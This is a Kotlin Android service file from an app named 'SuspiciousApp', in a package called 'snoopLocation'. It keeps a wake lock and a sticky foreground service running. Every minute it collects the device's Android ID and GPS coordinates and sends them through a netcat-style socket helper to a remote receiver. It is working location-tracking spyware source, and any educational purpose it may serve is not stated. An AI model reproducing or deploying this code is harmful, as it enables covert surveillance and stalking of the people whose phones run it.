/**
 * Thanks to Mohammad Moein Golchin a.k.a. MMG
 * https://stackoverflow.com/a/60972122
 * and Roberto Huertas
 * https://robertohuertas.com/2019/06/29/android_foreground_services/
 */

package com.example.suspiciousapp.snoopLocation

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.location.Location
import android.location.LocationManager
import android.os.*
import android.provider.Settings
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.example.suspiciousapp.MainActivity
import com.example.suspiciousapp.R
import com.example.suspiciousapp.netSock.netSock
import com.google.android.gms.location.*
import kotlinx.coroutines.*
import java.text.SimpleDateFormat
import java.util.*


class LocationHelperService : Service() {

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    private var wakeLock: PowerManager.WakeLock? = null
    private var isServiceStarted = false
    private var lokaatio = ""
    private var prevlok = ""

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startService()
        return START_STICKY
    }

    private fun startService() {
        isServiceStarted = true
        wakeLock =
                (getSystemService(Context.POWER_SERVICE) as PowerManager).run {
                    newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LocationHelperService::lock").apply {
                        acquire()
                    }
                }

        //Starting a loop in a coroutine
        GlobalScope.launch(Dispatchers.IO) {
            while (isServiceStarted) {
                launch(Dispatchers.IO) {

                    val df = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.mmmZ")
                    val gmtTime = df.format(Date())
                    val deviceId = Settings.Secure.getString(applicationContext.contentResolver, Settings.Secure.ANDROID_ID)
                    getLastLocation()
                    if (prevlok != lokaatio) {
                        coRoutine(deviceId + " " + gmtTime + " " + lokaatio + "\n")
                    }
                }
                delay(1 * 60 * 1000) //Run the loop every minute
            }
            //Not used in this implementation, but you could for example send an end packet or something here, when the loop ends
        }
    }

    override fun onCreate() {
        var notification = createNotification()
        startForeground(1, notification)

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
    }

    private val coroutineExceptionHandler = CoroutineExceptionHandler { _, _ ->
        //Handle error here, if coRoutine() fails

    }

    private fun coRoutine(msg: String) {
        GlobalScope.launch(coroutineExceptionHandler) {
            //
            val retVal = netSock.ncSend(msg)
        }
    }

    override fun onDestroy() {
        //Clean up your service logic here
    }

    private fun createNotification(): Notification {
        val notificationChannelId = "ENDLESS SERVICE CHANNEL"

        //Depending on the Android API that we're dealing with we will have
        // to use a specific method to create the notification
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager;
            val channel = NotificationChannel(
                    notificationChannelId,
                    "Endless Service notifications channel",
                    NotificationManager.IMPORTANCE_HIGH
            ).let {
                it.description = "Endless Service channel"
                it.enableLights(true)
                it.lightColor = Color.RED
                //You could add vibration if to the notification:
                //it.enableVibration(true)
                //it.vibrationPattern = longArrayOf(100, 200, 300, 400, 500, 400, 300, 200, 400)
                it
            }
            notificationManager.createNotificationChannel(channel)
        }

        val pendingIntent: PendingIntent = Intent(this, MainActivity::class.java).let { notificationIntent ->
            PendingIntent.getActivity(this, 0, notificationIntent, 0)
        }

        val builder: Notification.Builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Notification.Builder(
                this,
                notificationChannelId
        ) else Notification.Builder(this)

        return builder
                .setContentTitle("SuspiciousApp")
                .setContentText("SuspiciousApp running!")
                .setContentIntent(pendingIntent)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setTicker("Ticker text")
                .setPriority(Notification.PRIORITY_HIGH) //For under android 26 compatibility
                .build()
    }

    lateinit var mFusedLocationClient: FusedLocationProviderClient
    var retLok = ""


    @SuppressLint("MissingPermission")
    fun getLastLocation(): String {
        if (checkPermissions()) {
            if (isLocationEnabled()) {

                mFusedLocationClient!!.lastLocation.addOnCompleteListener { task ->
                    var location: Location? = task.result
                    if (location == null) {
                        requestNewLocationData()
                    } else {
                        prevlok = lokaatio
                        lokaatio = location.latitude.toString() + " " + location.longitude.toString()
                        retLok = location.toString()
                    }
                }
            } else {
                Toast.makeText(this, "Turn on location", Toast.LENGTH_LONG).show()
                val intent = Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)
                startActivity(intent)
            }
        }
        return retLok
    }

    @SuppressLint("MissingPermission")
    private fun requestNewLocationData() {
        var mLocationRequest = LocationRequest()
        mLocationRequest.priority = LocationRequest.PRIORITY_HIGH_ACCURACY
        mLocationRequest.interval = 0
        mLocationRequest.fastestInterval = 0
        mLocationRequest.numUpdates = 1

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        mFusedLocationClient!!.requestLocationUpdates(
                mLocationRequest, mLocationCallback,
                Looper.myLooper()
        )
    }

    private val mLocationCallback = object : LocationCallback() {
        override fun onLocationResult(locationResult: LocationResult) {
            val mLastLocation: Location = locationResult.lastLocation
            prevlok = lokaatio
            lokaatio = mLastLocation.latitude.toString() + " " + mLastLocation.longitude.toString()
        }
    }

    private fun isLocationEnabled(): Boolean {
        var locationManager: LocationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(
                LocationManager.NETWORK_PROVIDER
        )
    }

    private fun checkPermissions(): Boolean {
        if (ActivityCompat.checkSelfPermission(
                        this,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(
                        this,
                        Manifest.permission.ACCESS_FINE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
        ) {
            return true
        }
        return false
    }
}
